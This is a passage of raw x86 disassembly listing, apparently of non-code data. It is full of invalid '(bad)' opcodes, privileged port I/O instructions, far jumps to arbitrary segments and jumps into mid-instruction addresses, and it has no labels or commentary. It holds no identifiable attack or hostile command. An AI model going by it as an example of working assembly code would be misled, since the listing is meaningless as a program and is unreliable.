  421c23:	cmp    BYTE PTR [edi],al
  421c25:	xchg   ebx,eax
  421c26:	outs   dx,DWORD PTR ds:[esi]
  421c27:	fsub   st,st(6)
  421c29:	cli    
  421c2a:	(bad)  
  421c2b:	xchg   edi,eax
  421c2c:	pop    edi
  421c2d:	add    BYTE PTR [ecx],ch
  421c2f:	scas   eax,DWORD PTR es:[edi]
  421c30:	shl    BYTE PTR [ebp-0x1ddbdd9d],0x35
  421c37:	pop    DWORD PTR [ecx]
  421c39:	inc    ebx
  421c3a:	mov    eax,ds:0x5106300b
  421c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c40:	jmp    0x421c1c
  421c42:	mov    ah,0xde
  421c44:	adc    al,0xa2
  421c46:	add    BYTE PTR [esi+0x3de3f062],cl
  421c4c:	outs   dx,BYTE PTR ds:[esi]
  421c4d:	mov    ah,0xe8
  421c4f:	loop   0x421c14
  421c51:	mov    DWORD PTR [ebx+eiz*8],esi
  421c54:	jmp    0x21a5:0x179d2d38
  421c5b:	or     eax,0x51a70ed0
  421c60:	sbb    BYTE PTR [eax],al
  421c62:	push   0x44a6aa99
  421c67:	inc    esi
  421c68:	add    edi,ecx
  421c6a:	neg    DWORD PTR [edi-0x64762698]
  421c70:	jno    0x421cda
  421c72:	xor    esi,edi
  421c74:	mov    al,ds:0xfa198fe4
  421c79:	mov    BYTE PTR [ebx],bl
  421c7b:	and    eax,0x8f1b154d
  421c80:	out    0x94,eax
  421c82:	sub    DWORD PTR [eax+0x29],eax
  421c85:	std    
  421c86:	popf   
  421c87:	lock imul eax,DWORD PTR [edx],0x39
  421c8b:	jns    0x421c2e
  421c8d:	not    BYTE PTR [ecx-0x6fac6763]
  421c93:	push   es
  421c94:	push   es
  421c95:	retf   
  421c96:	pop    edx
  421c97:	repnz xor BYTE PTR [edi],0x65
  421c9b:	mov    al,ds:0x6d834b69
  421ca0:	in     eax,dx
  421ca1:	inc    ebp
  421ca2:	adc    al,0xa8
  421ca4:	xor    al,0xaf
  421ca6:	pop    eax
  421ca7:	ret    0x805c
  421caa:	mov    al,0xa6
  421cac:	dec    edx
  421cad:	or     al,0x3a
  421caf:	js     0x421c39
  421cb1:	in     al,dx
  421cb2:	xor    al,0x20
  421cb4:	push   edx
  421cb5:	popf   
  421cb6:	mov    ch,BYTE PTR [eax-0x3f5fd163]
  421cbc:	nop
  421cbd:	and    eax,0xb1c81fbb
  421cc2:	sahf   
  421cc3:	nop
  421cc4:	jecxz  0x421c4d
  421cc6:	pop    eax
  421cc7:	adc    eax,0x28c118d4
  421ccc:	sub    ch,BYTE PTR [esp+ebp*2-0x20]
  421cd0:	mov    edi,0xe36b5560
  421cd5:	dec    ebp
  421cd6:	cmp    eax,0x7a89e611
  421cdb:	leave  
  421cdc:	iret   
  421cdd:	rol    DWORD PTR [edx-0x2c],cl
  421ce0:	dec    eax
  421ce1:	jmp    0x421cd1
  421ce3:	test   al,0xdb
  421ce5:	enter  0x7a9f,0x7d
  421ce9:	cmc    
  421cea:	and    DWORD PTR [esi+0x6ee48e34],edx
  421cf0:	mov    WORD PTR [esi-0x37c5c9f3],ss
  421cf6:	or     BYTE PTR [edx+0x71],0x18
  421cfa:	push   ss
  421cfb:	stos   DWORD PTR es:[edi],eax
  421cfc:	xchg   esp,eax
  421cfd:	pop    eax
  421cfe:	push   es
  421cff:	mov    esp,esp
  421d01:	push   eax
  421d02:	push   esp
  421d03:	cmp    DWORD PTR [edi+ebp*1+0x4e],0xffffffca
  421d08:	jmp    0x421d81
  421d0a:	add    al,0xfa
  421d0c:	test   eax,0x444b8d1f
  421d11:	loopne 0x421cce
  421d13:	jne    0x421d44
  421d15:	jmp    0x421cc1
  421d17:	pop    eax
  421d18:	out    dx,al
  421d19:	imul   eax,ecx,0xffffffd8
  421d1c:	adc    dh,bh
  421d1e:	jp     0x421d79
  421d20:	push   esp
  421d21:	jg     0x421cad
  421d23:	popf   
  421d24:	dec    edi
  421d25:	mov    ebp,0xf095fe2c
  421d2a:	mov    esp,0xed3819c0
  421d2f:	test   al,0xb2
  421d31:	mov    esi,0x5414f761
  421d36:	cmp    dl,dh
  421d38:	xchg   ebx,eax
  421d39:	xchg   edx,eax
  421d3a:	mov    ah,0xfb
  421d3c:	pop    ebp
  421d3d:	mov    edx,0x1365eca7
  421d42:	jg     0x421db5
  421d44:	jno    0x421db7
  421d46:	jns    0x421cf2
  421d48:	retf   0x72ea
  421d4b:	jmp    0x421d48
  421d4d:	cmp    esp,DWORD PTR [esi]
  421d4f:	jl     0x421cd1
  421d51:	scas   eax,DWORD PTR es:[edi]
  421d52:	pop    ebx
  421d53:	mov    al,ds:0x7b647ecd
  421d58:	sbb    al,BYTE PTR [ecx-0x30d7a6f7]
  421d5e:	ret    
  421d5f:	xchg   ebx,ebp
  421d61:	ficomp DWORD PTR [edi]
  421d63:	cmp    al,0x2b
  421d65:	lahf   
  421d66:	dec    esi
  421d67:	adc    dh,ch
  421d69:	dec    esp
  421d6a:	std    
  421d6b:	xchg   DWORD PTR [edx-0x5b],ebx
  421d6e:	mov    edi,0x676159ab
  421d73:	sar    BYTE PTR [esi+edx*2-0x243dd8ef],cl
  421d7a:	sti    
  421d7b:	shr    BYTE PTR [ecx+edx*8],cl
  421d7e:	adc    BYTE PTR [ecx],al
  421d80:	and    dl,ch
  421d82:	addps  xmm7,XMMWORD PTR [ebp+0x1ea87e8c]
  421d89:	jns    0x421d7b
  421d8b:	xchg   cl,cl
  421d8d:	out    0x6e,eax
  421d8f:	jns    0x421d98
  421d91:	nop
  421d92:	lock mov bl,BYTE PTR [edx]
  421d95:	inc    ecx
  421d96:	nop
  421d97:	pushw  0x87f4
  421d9b:	mov    dl,0xf9
  421d9d:	jbe    0x421d90
  421d9f:	ins    BYTE PTR es:[edi],dx
  421da0:	enter  0x37f5,0x4e
  421da4:	xchg   ecx,eax
  421da5:	fld    TBYTE PTR [edi+0x5fc23384]
  421dab:	call   ecx
  421dad:	push   0xa93399ca
  421db2:	cmp    dh,BYTE PTR [ebp+edi*8-0x1e]
  421db6:	mov    ebp,DWORD PTR cs:[ecx]
  421db9:	inc    ecx
  421dba:	mov    edx,0x4840d9d9
  421dbf:	or     al,0x64
  421dc1:	mov    ah,0x98
  421dc3:	jne    0x421d9d
  421dc5:	lods   al,BYTE PTR ds:[esi]
  421dc6:	xchg   DWORD PTR [ecx-0x4267e0a5],ecx
  421dcc:	push   edx
  421dcd:	dec    ecx
  421dce:	xchg   BYTE PTR fs:[edi],bl
  421dd1:	out    dx,eax
  421dd2:	inc    edx
  421dd3:	mov    dl,0xd2
  421dd5:	fistp  WORD PTR [esi]
  421dd7:	or     eax,0x972346b7
  421ddc:	outs   dx,BYTE PTR ds:[esi]
  421ddd:	inc    ebp
  421dde:	or     al,0x83
  421de0:	or     ch,BYTE PTR [ebx]
  421de2:	cmp    DWORD PTR [edi+0x59],0x53
  421de6:	inc    ebp
  421de7:	aad    0x59
  421de9:	outs   dx,BYTE PTR ds:[esi]
  421dea:	mov    ?,WORD PTR [edx]
  421dec:	(bad)  
  421ded:	xor    eax,0xf29c1346
  421df2:	retf   
  421df3:	fadd   st(1),st
  421df5:	and    ch,ah
  421df7:	loopne 0x421da3
  421df9:	sbb    edi,ebx
  421dfb:	sub    edi,DWORD PTR [ebp+0xe7bba7e]
  421e01:	xchg   BYTE PTR [esi+0x383c2ee8],bl
  421e07:	scas   eax,DWORD PTR es:[edi]
  421e08:	push   0x151113b4
  421e0d:	pushf  
  421e0e:	in     al,dx
  421e0f:	jmp    0x421df1
  421e11:	jno    0x421daf
  421e13:	sub    bh,BYTE PTR [edi-0x34]
  421e16:	sbb    al,cl
  421e18:	mov    cl,0xc5
  421e1a:	out    dx,eax
  421e1b:	in     al,dx
  421e1c:	jge    0x421e42
  421e1e:	test   ch,bl
  421e20:	push   esp
  421e21:	pop    esi
  421e22:	mov    cl,BYTE PTR [edx+0x19]
  421e25:	aas    
  421e26:	xor    DWORD PTR [ebx+0x66],edx
  421e29:	xchg   DWORD PTR [edx+0x24],edx
  421e2c:	xchg   esp,eax
  421e2d:	test   eax,0x4470e0f
  421e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e33:	add    al,0x68
  421e35:	push   ds
  421e36:	xor    DWORD PTR [ebx],ecx
  421e38:	loop   0x421e06
  421e3a:	lahf   
  421e3b:	and    eax,0xc9fa8969
  421e40:	iret   
  421e41:	dec    esp
  421e42:	mov    esi,0x47e05a59
  421e47:	jp     0x421e40
  421e49:	and    al,0x27
  421e4b:	stc    
  421e4c:	or     cl,BYTE PTR [eax]
  421e4e:	stos   DWORD PTR es:[edi],eax
  421e4f:	pop    edi
  421e50:	dec    bl
  421e52:	pusha  
  421e53:	cld    
  421e54:	or     eax,0x4babee78
  421e59:	enter  0xa04f,0x93
  421e5d:	and    al,0x73
  421e5f:	jmp    0x3697f5ef
  421e64:	inc    esi
  421e65:	jmp    0x421e50
  421e67:	or     BYTE PTR [eax+0x44dbdff9],cl
  421e6d:	sub    edi,DWORD PTR [esi]
  421e6f:	or     edi,ebx
  421e71:	leave  
  421e72:	jae    0x421ede
  421e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e75:	mov    eax,ds:0x4c4f265
  421e7a:	or     BYTE PTR [ebp+0x32b1baf8],dl
  421e80:	xlat   BYTE PTR ds:[ebx]
  421e81:	rol    DWORD PTR [edi+0x4af34279],1
  421e87:	sar    ebx,0x4e
  421e8a:	fs dec eax
  421e8c:	sbb    bl,0xf1
  421e8f:	fadd   DWORD PTR [ecx+edx*1+0x5746ddb5]
  421e96:	pop    edx
  421e97:	js     0x421e67
  421e99:	mov    WORD PTR [esi],gs
  421e9b:	xor    bh,BYTE PTR [ecx+0x37659554]
  421ea1:	enter  0x1336,0xe
  421ea5:	gs push 0x56
  421ea8:	jmp    0xeae21b8
  421ead:	mov    ds:0xd97c6f36,al
  421eb2:	jge    0x421eb5
  421eb4:	int3   
  421eb5:	xchg   DWORD PTR [eax+0x5d997c26],edi
  421ebb:	push   cs
  421ebc:	adc    bl,dh
  421ebe:	out    0xb4,al
  421ec0:	out    dx,al
  421ec1:	sti    
  421ec2:	out    0x52,al
  421ec4:	xchg   bl,al
  421ec6:	popa   
  421ec7:	dec    ecx
  421ec8:	sbb    eax,0xbf7c243
  421ecd:	lods   eax,DWORD PTR ds:[esi]
  421ece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ecf:	xor    edx,DWORD PTR [ecx-0x75]
  421ed2:	into   
  421ed3:	test   eax,0x8db6ddf9
  421ed8:	icebp  
  421ed9:	and    eax,0x87b7410c
  421ede:	and    al,0xbe
  421ee0:	push   edx
  421ee1:	and    al,0xa7
  421ee3:	popa   
  421ee4:	inc    ebp
  421ee5:	xchg   ebx,eax
  421ee6:	xchg   DWORD PTR [ebp+0x77],esi
  421ee9:	pop    ds
  421eea:	mov    ecx,0x3656907f
  421eef:	jbe    0x421e71
  421ef1:	sahf   
  421ef2:	fmul   st,st(2)
  421ef4:	push   esp
  421ef5:	xor    DWORD PTR [edx+esi*2-0x653d5557],0xffffffe5
  421efd:	sub    BYTE PTR [ecx+0x637fd86c],dl
  421f03:	mov    eax,0x9ac1ae26
  421f08:	push   0xcfbf93c0
  421f0d:	mov    DWORD PTR ds:0xab56dd0b,eax
  421f13:	dec    esi
  421f14:	mov    dl,0xe6
  421f16:	ja     0x421f64
  421f18:	seta   BYTE PTR [ebp-0x78]
  421f1c:	sub    al,0x32
  421f1e:	sub    DWORD PTR [esi+0x2],esp
  421f21:	push   edi
  421f22:	std    
  421f23:	pop    esi
  421f24:	or     al,0x6a
  421f26:	jo     0x421f0b
  421f28:	ret    
  421f29:	xchg   DWORD PTR [ebp+edx*8-0x7b61df2f],eax
  421f30:	repnz out 0x4b,eax
  421f33:	es mov bl,0x88
  421f36:	dec    ebx
  421f37:	and    eax,0xc9bc4bfe
  421f3c:	adc    DWORD PTR [esi-0x4f0014d3],edx
  421f42:	mov    al,ds:0x749d541d
  421f47:	sub    dh,BYTE PTR [edx]
  421f49:	rcl    BYTE PTR [esi+0x2f],0x16
  421f4d:	inc    esp
  421f4e:	in     al,0xf0
  421f50:	add    edi,DWORD PTR [ecx+eax*1-0x67]
  421f54:	mov    esp,?
  421f56:	or     dl,cl
  421f58:	mov    bh,0x5d
  421f5a:	mov    al,0xa0
  421f5c:	ret    
  421f5d:	jb     0x421f68
  421f5f:	addr16 push edx
  421f61:	sbb    ax,0xfab4
  421f65:	(bad)  
  421f66:	jbe    0x421f8e
  421f68:	jbe    0x421f0a
  421f6a:	mov    eax,ds
  421f6c:	or     DWORD PTR [ecx],0xfed536d8
  421f72:	jns    0x421f9c
  421f74:	xor    eax,0x482f41e6
  421f79:	cmp    ah,BYTE PTR [esi]
  421f7b:	ret    0x7b58
  421f7e:	lea    esi,[esi]
  421f80:	div    bh
  421f82:	mov    bh,0xd1
  421f84:	xrelease mov DWORD PTR [ebp-0x389a4e87],edx
  421f8b:	fwait
  421f8c:	js     0x421f2b
  421f8e:	mov    esi,DWORD PTR [ebx]
  421f90:	pop    edx
  421f91:	mov    ch,0x6b
  421f93:	js     0x422003
  421f95:	push   ecx
  421f96:	push   esp
  421f97:	push   0xffffffa5
  421f99:	push   0xffffffc9
  421f9b:	mov    ch,0x2b
  421f9d:	stos   DWORD PTR es:[edi],eax
  421f9e:	adc    ah,BYTE PTR [edx]
  421fa0:	inc    esi
  421fa1:	jmp    0x421fe1
  421fa3:	ins    DWORD PTR es:[edi],dx
  421fa4:	mov    al,0xe3
  421fa6:	sub    eax,0x313baf84
  421fab:	pop    ecx
  421fac:	mov    es,WORD PTR [eax+0x68]
  421faf:	mov    cl,0x90
  421fb1:	xchg   esi,eax
  421fb2:	jle    0x422002
  421fb4:	or     BYTE PTR fs:[eax-0x2e4f9cef],dh
  421fbb:	sbb    ecx,ebp
  421fbd:	inc    edx
  421fbe:	ror    BYTE PTR [ecx+eax*8],0x28
  421fc2:	adc    ch,BYTE PTR [edx+ebx*2-0x3746781d]
  421fc9:	pushf  
  421fca:	ja     0x421f98
  421fcc:	or     cl,BYTE PTR [edx-0x188c9fb0]
  421fd2:	lahf   
  421fd3:	dec    ecx
  421fd4:	mov    BYTE PTR [edi-0x212ec7c9],bl
  421fda:	sbb    eax,0xa5683dae
  421fdf:	push   edx
  421fe0:	jmp    0x421f7f
  421fe2:	ret    0xf417
  421fe5:	out    dx,al
  421fe6:	jle    0x421f95
  421fe8:	push   ebp
  421fe9:	frstor [edx]
  421feb:	clc    
  421fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fed:	icebp  
  421fee:	or     eax,0x713f25da
  421ff3:	out    0x1,al
  421ff5:	push   esi
  421ff6:	and    esp,DWORD PTR [edx-0x4840ae9a]
  421ffc:	pop    eax
  421ffd:	add    dl,al
  421fff:	dec    edi
  422000:	scas   eax,DWORD PTR es:[edi]
  422001:	div    DWORD PTR [ebx-0x1534e773]
  422007:	inc    ebp
  422008:	and    ah,BYTE PTR [ecx+0x37727a50]
  42200e:	mov    eax,ds:0x195611b5
  422013:	mov    DWORD PTR [ebx+0x2],eax
  422016:	push   esp
  422017:	and    BYTE PTR [ebp*2+0x2c83c7ab],0xa2
  42201f:	adc    BYTE PTR [esi],bl
  422021:	jle    0x422043
  422023:	pop    edi
  422024:	lds    edi,FWORD PTR fs:[ecx+0x7]
  422028:	paddsw mm5,mm6
  42202b:	and    ecx,DWORD PTR [eax+0x5c995fbf]
  422031:	mov    edx,DWORD PTR [eax-0x2fa457c4]
  422037:	sahf   
  422038:	jg     0x421ff2
  42203a:	mov    edi,0x6281c281
  42203f:	push   ecx
  422040:	mov    ds:0x1cd839f8,eax
  422045:	sahf   
  422046:	clc    
  422047:	fdiv   DWORD PTR [ebp-0x5c]
  42204a:	push   es
  42204b:	push   edi
  42204c:	sbb    ebp,DWORD PTR [ebp+0x4acf9c80]
  422052:	fist   DWORD PTR [esi]
  422054:	adc    DWORD PTR [ebp+0x7a],esi
  422057:	jmp    0xb9f5f1a6
  42205c:	aam    0x49
  42205e:	mov    bl,0x6f
  422060:	popa   
  422061:	jne    0x4220d9
  422063:	dec    esp
  422064:	popf   
  422065:	cmp    dh,BYTE PTR [ecx-0x73916e4d]
  42206b:	pop    ebx
  42206c:	mov    eax,0xdd0e852
  422071:	ret    
  422072:	pop    esi
  422073:	xchg   ebp,eax
  422074:	ss push esi
  422076:	push   es
  422077:	das    
  422078:	(bad)  
  422079:	cmp    esp,esp
  42207b:	inc    eax
  42207c:	sub    BYTE PTR es:[ecx-0x8],ah
  422080:	ret    0x54e0
  422083:	dec    edx
  422084:	cmp    BYTE PTR [ebp+0x2ca60bc6],cl
  42208a:	popa   
  42208b:	sbb    eax,0x381d716d
  422090:	xchg   BYTE PTR [eax+0x19],al
  422093:	push   ds
  422094:	pushf  
  422095:	jnp    0x4220fa
  422097:	jnp    0x422106
  422099:	popf   
  42209a:	mov    dl,0xd2
  42209c:	dec    edx
  42209d:	push   0x565e3496
  4220a2:	iret   
  4220a3:	sub    al,0x48
  4220a5:	aam    0xab
  4220a7:	or     BYTE PTR [eax+0xd0fd097],0xf5
  4220ae:	jb     0x422102
  4220b0:	loop   0x42207d
  4220b2:	ins    BYTE PTR es:[edi],dx
  4220b3:	dec    esi
  4220b4:	cvtpi2ps xmm3,QWORD PTR [ecx-0x60]
  4220b8:	fld    DWORD PTR [edx]
  4220ba:	loop   0x422079
  4220bc:	data16 jg 0x4220d5
  4220bf:	sbb    bh,BYTE PTR [eax]
  4220c1:	das    
  4220c2:	sar    ecx,1
  4220c4:	pushf  
  4220c5:	sar    DWORD PTR [edx+0x51],0x9e
  4220c9:	xor    DWORD PTR [ebx+0xc],ebp
  4220cc:	dec    ebx
  4220cd:	rol    DWORD PTR ds:0xcbf6fc9f,1
  4220d3:	dec    ebx
  4220d4:	sbb    dh,0x7
  4220d7:	rol    DWORD PTR [ebp-0x4c],cl
  4220da:	mov    ah,0x1
  4220dc:	sub    DWORD PTR [ecx+ebp*2],esi
  4220df:	mov    ebp,es
  4220e1:	jns    0x422161
  4220e3:	push   ebp
  4220e4:	jmp    0x4220cb
  4220e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220e7:	push   edx
  4220e8:	mov    WORD PTR [ecx+0x2],?
  4220eb:	inc    ebp
  4220ec:	dec    ecx
  4220ed:	adc    eax,0x4c525799
  4220f2:	sub    eax,0xf8f131ea
  4220f7:	lods   al,BYTE PTR ds:[esi]
  4220f8:	fs jle 0x422107
  4220fb:	mov    al,ds:0x84588470
  422100:	imul   ebp,DWORD PTR [esi],0x77545644
  422106:	inc    ebp
  422107:	loopne 0x422164
  422109:	call   0xc8958323
  42210e:	adc    BYTE PTR [esi-0x53ca715],bh
  422114:	pop    edi
  422115:	push   edi
  422116:	inc    esi
  422117:	mov    cl,0xd2
  422119:	dec    edx
  42211a:	xchg   esi,eax
  42211b:	add    eax,0xec4635b6
  422120:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422122:	jbe    0x4220c0
  422124:	pushf  
  422125:	out    0xb8,eax
  422127:	mov    dh,0x50
  422129:	adc    al,0xc5
  42212b:	xor    BYTE PTR [edx],cl
  42212d:	cmc    
  42212e:	fcmovb st,st(5)
  422130:	xor    BYTE PTR [ebx+0x3528099e],dh
  422136:	lock sbb DWORD PTR [esi],ebx
  422139:	xchg   edi,eax
  42213a:	shr    DWORD PTR [eax+0x3d],0xf1
  42213e:	dec    dx
  422140:	mov    eax,ds:0x61a85814
  422145:	adc    BYTE PTR [eax-0x5651ee1c],ah
  42214b:	(bad)  
  42214d:	ss cwde 
  42214f:	mov    eax,DWORD PTR [esi]
  422151:	pop    esi
  422152:	loope  0x422149
  422154:	xchg   edi,eax
  422155:	fnstcw WORD PTR [edx+0x4c1aec6e]
  42215b:	out    0x24,al
  42215d:	dec    eax
  42215e:	mov    BYTE PTR [esi-0x24],0xf4
  422162:	repnz mov bh,BYTE PTR [edi-0xfc6cc49]
  422169:	pop    ecx
  42216a:	mov    eax,ds:0x52b230e5
  42216f:	push   cs
  422170:	fs push ss
  422172:	daa    
  422173:	mov    ds:0x3b660ebc,al
  422178:	cmp    DWORD PTR [ecx-0x69d9e844],ebp
  42217e:	stos   BYTE PTR es:[edi],al
  42217f:	mov    dh,0xc1
  422181:	in     eax,dx
  422182:	jge    0x42211f
  422184:	out    0x5c,eax
  422186:	adc    bl,BYTE PTR [esi]
  422188:	shld   DWORD PTR [ebx+0x1a],edi,cl
  42218c:	add    al,0x30
  42218e:	ficomp DWORD PTR [ebp+0x5264eec1]
  422194:	and    DWORD PTR [edi+esi*8+0x5a274880],ecx
  42219b:	add    DWORD PTR [edi-0x27],ecx
  42219e:	cdq    
  42219f:	pop    edx
  4221a0:	jno    0x42212a
  4221a2:	lahf   
  4221a3:	call   0x4d1e:0x618f00a4
  4221aa:	push   cs
  4221ab:	clc    
  4221ac:	aaa    
  4221ad:	(bad)  
  4221ae:	retf   0xcbd6
  4221b1:	jnp    0x42218e
  4221b3:	xchg   edi,eax
  4221b4:	aam    0x6c
  4221b6:	pop    esi
  4221b7:	or     DWORD PTR [esi-0x78b2ad97],ecx
  4221bd:	push   ecx
  4221be:	push   esi
  4221bf:	jmp    0x30a5:0xcdd34339
  4221c6:	xchg   ecx,eax
  4221c7:	dec    ebx
  4221c8:	dec    eax
  4221c9:	test   eax,0xb889a6c6
  4221ce:	in     eax,dx
  4221cf:	add    eax,0xffffffd7
  4221d2:	js     0x4221a7
  4221d4:	xchg   ecx,eax
  4221d5:	jo     0x422189
  4221d7:	push   es
  4221d8:	xchg   edi,eax
  4221d9:	sbb    DWORD PTR [esi+ebp*2],ebp
  4221dc:	adc    esi,esi
  4221de:	inc    edi
  4221df:	push   ebx
  4221e0:	jmp    0xa099:0x719c3482
  4221e7:	shr    bh,cl
  4221e9:	dec    esi
  4221ea:	cmp    BYTE PTR ds:0x6f15741f,dh
  4221f0:	cmp    eax,0x16198bd
  4221f5:	repnz or edi,DWORD PTR [esp+edx*4]
  4221f9:	mov    ecx,0x150df415
  4221fe:	out    dx,al
  4221ff:	mov    cl,BYTE PTR [edi-0x2c46e29b]
  422205:	ins    DWORD PTR es:[edi],dx
  422206:	pop    esi
  422207:	cmp    eax,0x8efbb1c9
  42220c:	xchg   edi,eax
  42220d:	add    DWORD PTR [edi-0x2a],0x33f3048a
  422214:	and    esp,ecx
  422216:	out    dx,eax
  422217:	mov    esi,0xdf035c25
  42221c:	cli    
  42221d:	jp     0x42222e
  42221f:	fisttp DWORD PTR [eax]
  422221:	(bad)  
  422222:	arpl   WORD PTR [ebx-0x7fa12b9],sp
  422228:	adc    al,0xce
  42222a:	mov    cs,WORD PTR [edi+0x1381f8b1]
  422230:	hlt    
  422231:	sar    DWORD PTR [edx+edi*1+0x46f641aa],1
  422238:	ds jmp 0xaeadf17b
  42223e:	mov    edx,0x88a881ca
  422243:	mov    edx,0xbfccfef0
  422248:	push   0x30a5c6d3
  42224d:	lea    ebp,[ecx-0x3e]
  422250:	pop    eax
  422251:	jle    0x4222a6
  422253:	call   0xfd24:0xc722a579
  42225a:	dec    esp
  42225b:	(bad)  
  42225c:	mov    ebx,0x8e206dd6
  422261:	mov    ds:0xb003da03,eax
  422266:	(bad)  
  422267:	aad    0x8
  422269:	jge    0x42228a
  42226b:	xor    ecx,DWORD PTR ss:[edx]
  42226e:	inc    edi
  42226f:	ja     0x42221d
  422271:	out    dx,eax
  422272:	cmp    BYTE PTR [ebp-0x2bb9933c],dh
  422278:	sub    eax,0x36fa1e2
  42227d:	aad    0xff
  42227f:	repz push ebx
  422281:	ror    BYTE PTR [eax],cl
  422283:	(bad)  
  422284:	xor    ebx,DWORD PTR [edi+0x1a]
  422287:	jle    0x4222cf
  422289:	jo     0x42223d
  42228b:	hlt    
  42228c:	repz push eax
  42228e:	cli    
  42228f:	jecxz  0x422287
  422291:	inc    ecx
  422292:	hlt    
  422293:	push   ecx
  422294:	pop    esi
  422295:	ja     0x422263
  422297:	stc    
  422298:	aaa    
  422299:	push   ss
  42229a:	mov    esp,0x6fa1a03f
  42229f:	sub    eax,0x9936c225
  4222a4:	cmp    al,0xfa
  4222a6:	fdivr  st(0),st
  4222a8:	enter  0xf10,0xce
  4222ac:	sahf   
  4222ad:	mov    edi,0x74b9930d
  4222b2:	imul   esi,ebp,0xcd34b7be
  4222b8:	paddq  mm6,QWORD PTR [ebx]
  4222bb:	mov    cl,ah
  4222bd:	imul   edx,DWORD PTR [ecx-0x759d3ef3],0xa5e4a70b
  4222c7:	int    0x35
  4222c9:	cwde   
  4222ca:	mov    dh,0xc
  4222cc:	jnp    0x422299
  4222ce:	sub    edx,DWORD PTR ds:0xf6177059
  4222d4:	ins    BYTE PTR es:[edi],dx
  4222d5:	push   esp
  4222d6:	adc    DWORD PTR [edi-0x4c],eax
  4222d9:	xor    al,0x90
  4222db:	push   ebp
  4222dc:	int3   
  4222dd:	adc    eax,0x3431f69e
  4222e2:	clc    
  4222e3:	mov    ebx,0x7fa71752
  4222e8:	popf   
  4222e9:	adc    ecx,DWORD PTR [edi+ecx*4]
  4222ec:	adc    al,BYTE PTR [eax-0x4bbc75e6]
  4222f2:	enter  0x407c,0xf8
  4222f6:	sub    ah,BYTE PTR [eax]
  4222f8:	mul    BYTE PTR [ecx+0xd]
  4222fb:	icebp  
  4222fc:	xor    eax,0xf15f153e
  422301:	dec    eax
  422302:	xor    DWORD PTR [edi],ebp
  422304:	into   
  422305:	push   ebx
  422306:	in     al,0xa7
  422308:	inc    esp
  422309:	push   es
  42230a:	xchg   esp,eax
  42230b:	push   ss
  42230c:	pop    ss
  42230d:	jmp    0x50f7c487
  422312:	xor    BYTE PTR ds:0xa4203a43,bl
  422318:	mov    ebp,0xa4fa31f0
  42231d:	lods   al,BYTE PTR ds:[esi]
  42231e:	sub    BYTE PTR [eax-0x80],dh
  422321:	cmp    edi,DWORD PTR [edi-0x59]
  422324:	xor    DWORD PTR [ebx-0xd],0xffffff95
  422328:	mov    cl,al
  42232a:	aas    
  42232b:	mov    bl,0xff
  42232d:	icebp  
  42232e:	add    DWORD PTR [ecx+ebp*4+0x29],edi
  422332:	or     BYTE PTR [esi+0xd1d3172],bh
  422338:	imul   BYTE PTR [ebx]
  42233a:	or     eax,0x28198fcc
  42233f:	xchg   DWORD PTR [eax-0x20],esi
  422342:	das    
  422343:	retf   
  422344:	jbe    0x42237f
  422346:	push   edi
  422347:	into   
  422348:	jmp    0xbb806ec9
  42234d:	pop    ecx
  42234e:	loopne 0x4222e0
  422350:	test   eax,0x1fc25d41
  422355:	daa    
  422356:	repnz retf 0xefd2
  42235a:	mov    ah,0x5b
  42235c:	fidiv  DWORD PTR [edx]
  42235e:	out    dx,al
  42235f:	gs (bad) 
  422361:	cwde   
  422362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422363:	gs inc eax
  422365:	mov    WORD PTR [esi],es
  422367:	jo     0x422354
  422369:	fcomp  DWORD PTR [eax]
  42236b:	dec    ecx
  42236c:	inc    ecx
  42236d:	imul   ebx,DWORD PTR [ebx-0x653d73d6],0xfd8fff0c
  422377:	mov    BYTE PTR [ebx*4+0x3f6964ec],bl
  42237e:	sub    eax,0xcb584ab8
  422383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422384:	and    DWORD PTR [edi+0x6b386747],edi
  42238a:	(bad)  
  42238c:	bound  esp,QWORD PTR [edx-0x12]
  42238f:	into   
  422390:	icebp  
  422391:	mov    bh,bl
  422393:	outs   dx,BYTE PTR ds:[esi]
  422394:	push   ebx
  422395:	jp     0x4223e5
  422397:	fwait
  422398:	cmp    eax,0xa16b6cd7
  42239d:	mov    edi,0x6177bbf7
  4223a2:	xlat   BYTE PTR ds:[ebx]
  4223a3:	push   ds
  4223a4:	xor    BYTE PTR [ecx-0x7caeb0c9],0x9a
  4223ab:	dec    esi
  4223ac:	or     eax,0xf5bba6cd
  4223b1:	(bad)  
  4223b2:	gs popf 
  4223b4:	xor    cl,BYTE PTR [eax+0x47cc6ea3]
  4223ba:	hlt    
  4223bb:	jg     0x4223be
  4223bd:	mov    ch,0xff
  4223bf:	out    dx,al
  4223c0:	jge    0x4223d2
  4223c2:	jbe    0x4223cc
  4223c4:	ficomp DWORD PTR [edi+ebp*1]
  4223c7:	shl    DWORD PTR [edi+0x3],cl
  4223ca:	sub    ebp,DWORD PTR [ebx+0x339967d7]
  4223d0:	pop    esi
  4223d1:	pop    ss
  4223d2:	enter  0xfd86,0xef
  4223d6:	jmp    0xaaee:0xf4ae7a22
  4223dd:	mov    eax,0x287419d1
  4223e2:	cmp    ebx,DWORD PTR [eax+ebp*1-0x42]
  4223e6:	aam    0x4e
  4223e8:	icebp  
  4223e9:	call   0x1057:0x3f7885b0
  4223f0:	(bad)  
  4223f1:	fst    DWORD PTR [eax-0x24b2f492]
  4223f7:	test   eax,0x9f2537ef
  4223fc:	push   eax
  4223fd:	test   DWORD PTR [edi],esi
  4223ff:	iret   
  422400:	adc    eax,0x68b6fc50
  422405:	mov    dl,BYTE PTR [eax+0x54]
  422408:	(bad)  
  422409:	mov    ds:0xd0f05167,al
  42240e:	outs   dx,DWORD PTR ds:[esi]
  42240f:	jecxz  0x422444
  422411:	jbe    0x42243f
  422413:	add    BYTE PTR [edx],bh
  422415:	outs   dx,DWORD PTR ds:[esi]
  422416:	ficom  WORD PTR [ebx-0x5d130d61]
  42241c:	pop    ss
  42241d:	xor    esi,DWORD PTR [esi+0x1c8e1a13]
  422423:	(bad)  
  422424:	lock adc edx,edi
  422427:	shl    DWORD PTR [ecx+0xf],cl
